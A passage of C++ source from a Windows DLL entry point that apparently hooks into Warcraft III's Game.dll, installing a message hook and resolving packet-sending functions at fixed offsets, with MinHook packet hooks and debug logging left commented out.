		random16players.push_back(0xFF);

		StartTicks = GetTickCount();
		MainModule = hDLL;
		MainThread = GetCurrentThreadId();
		GameDll = (unsigned char*)GetModuleHandleA("Game.dll");
		if (hhookSysMsg == 0)
			hhookSysMsg = SetWindowsHookExW(WH_GETMESSAGE, HookCallWndProc, GetModuleHandleA("Game.dll"), GetCurrentThreadId());

		sub_6F5C2E30_addr = GameDll + 0x5C2E30;
		ItemVtable = GameDll + 0x9320B4;
		pW3XGlobalClass = (GameDll + 0xAB4F80);
		GAME_SendPacket = (GAME_SendPacket_p)(GameDll + 0x54D970);
		GetFrameItemAddress = (pGetFrameItemAddress)(GameDll + 0x5FA970);
		sub_6F53E6B0 = (p_6F53E6B0)(GameDll + 0x53E6B0);
		GetBnetSockStr = (pGetBnetSockStr)(GameDll + 0x688F30);/*

		*/

		GAME_SendPacketDir = (GAME_SendPacketDir_p)(GameDll + 0x6DF040);
		GAME_SendPacketDir2 = (GAME_SendPacketDir2_p)(GameDll + 0x6DAE20);

		//MH_CreateHook(GAME_SendPacketDir, &GAME_SendPacketDir_my, reinterpret_cast<void**>(&GAME_SendPacketDir_ptr));
		//MH_EnableHook(GAME_SendPacketDir);

		

		//MH_CreateHook(GAME_SendPacket, &GAME_SendPacket_my, reinterpret_cast<void**>(&GAME_SendPacket_ptr));
		//MH_EnableHook(GAME_SendPacket);


		/*	char tmpbuf[256];
			sprintf_s(tmpbuf, "iccwc3:%X gamedll:%X reconnect:%X mainmodule:%X\n", (int)GetModuleHandleA("iccwc3.icc"),
				(int)GetModuleHandleA("game.dll"), (int)GetModuleHandleA("reconnect.dll"), (int)hDLL);
			WatcherLogAddLine(tmpbuf);*/
	}
	else if (r == DLL_PROCESS_DETACH)
	{
		if (MainThread == GetCurrentThreadId())
		{
			TerminateProcess(GetCurrentProcess(), 0);
			ExitProcess(0);
		}

		if (hhookSysMsg != 0)
			UnhookWindowsHookEx(hhookSysMsg);
		/*	MH_DisableHook(MH_ALL_HOOKS);
			MH_Uninitialize();*/
		hhookSysMsg = 0;
	}

	return TRUE;
}
